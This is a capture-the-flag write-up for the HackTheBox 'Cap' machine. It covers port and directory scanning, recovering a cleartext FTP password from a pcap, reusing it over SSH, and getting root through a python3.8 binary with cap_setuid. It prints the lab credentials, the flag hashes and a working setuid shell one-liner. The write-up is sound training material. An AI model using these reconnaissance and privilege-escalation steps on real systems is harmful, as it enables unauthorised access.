# HackTheBox-Cap Writeup | PCAP & SUID

![Screen Shot 2021-10-02 at 08 25 12](https://user-images.githubusercontent.com/87259078/135722831-39856c2c-ffde-42b7-a023-ebcb636c609f.png)

# Synopsis

“Cap” is marked as easy difficulty machine which features Gunicorn web server running a security dashboard. The dashboard gives access to Pcap files to analyze locally, one of the Pcap files has clear text password used to access FTP service. Because of password reuse we can able to login via SSH service. A python binary has given root’s capabilities to run, we take advantage of that to gain root’s shell.

# Skills Required

- Web Enumeration
- Pcap Analysis

# Skills Learned

- Exploiting 'Cap-SetUID' Functionality

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.16s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Mon, 07 Jun 2021 07:08:58 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 07 Jun 2021 07:08:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 07 Jun 2021 07:08:53 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```

Nmap reveals only three ports are open on machine. Let’s access HTTP service.

![Screen Shot 2021-06-07 at 22.50.48.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/F5E2CB1C-1BDD-48B7-9F40-C246DFCC6783/FBF530BA-1182-4A3F-B8B7-4692176503F6_2/Screen%20Shot%202021-06-07%20at%2022.50.48.png)

It running a security dashboard, it shows security events, failed logins and port scans IP. In left panel we see there are options to access network status, IP config and Pcap files for analysis. Let’s look into Pcap files.

![Screen Shot 2021-06-07 at 23.00.24.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/F5E2CB1C-1BDD-48B7-9F40-C246DFCC6783/C78D28B6-0064-4A63-848F-655F0741FAC4_2/Screen%20Shot%202021-06-07%20at%2023.00.24.png)

It shows us the captured packets information. Let’s download the Pcap file and open in wireshark.

![Screen Shot 2021-06-07 at 23.08.49.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/F5E2CB1C-1BDD-48B7-9F40-C246DFCC6783/4FA74A65-326E-4EFD-8B0B-6B69A02B848F_2/Screen%20Shot%202021-06-07%20at%2023.08.49.png)

The Wireshark reveals the information which has sent from my machine to target machine. Let’s run directory brute force on Pcap directory to find any  Pcap files.

```
⛩\> gobuster dir -u http://10.10.10.245/data/ -t 30 -w /usr/share/wordlists/dirb/common.txt -b 302,403,404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.245/data/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   302,403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/07 23:11:44 Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 200) [Size: 17147]
/00                   (Status: 200) [Size: 17147]
/01                   (Status: 200) [Size: 17147]
/02                   (Status: 200) [Size: 17144]
/03                   (Status: 200) [Size: 17144]
/1                    (Status: 200) [Size: 17147]
/2                    (Status: 200) [Size: 17144]
/3                    (Status: 200) [Size: 17144]
```

There are multiple files are inside data directory, let’s read the first file.

# Initial Access

![Screen Shot 2021-06-07 at 23.15.18.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/F5E2CB1C-1BDD-48B7-9F40-C246DFCC6783/0056B173-57F9-4415-8F04-1D779DBAB3F9_2/Screen%20Shot%202021-06-07%20at%2023.15.18.png)

Download the pcap file and open it in Wireshark application.

![Screen Shot 2021-06-07 at 23.34.43.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/F5E2CB1C-1BDD-48B7-9F40-C246DFCC6783/1B3FC3E4-420F-4CAC-AC11-2E5D7E01075C_2/Screen%20Shot%202021-06-07%20at%2023.34.43.png)

Credentials: Nathan : Buck3tH4TF0RM3!

This Pcap file has username and password for FTP service. Let’s use these credentials to login via SSH and read the user flag.

```
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ cat user.txt
5fa34bf4760d0eebd32795736e30bac1
```

# Privilege Escalation

Let’s run LinPeas to find any escalation paths.

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

LinPeas result reveals that ‘cap_setuid’ capability is enabled on python3.8 binary. This simply means, the user has privilege to run this program as root.

[https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

root@cap:~# whoami && id
root
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:~# cat /root/root.txt
5f5c3232eca242555926ab18c70d43ad
```

We got access to root shell and read the root flag.

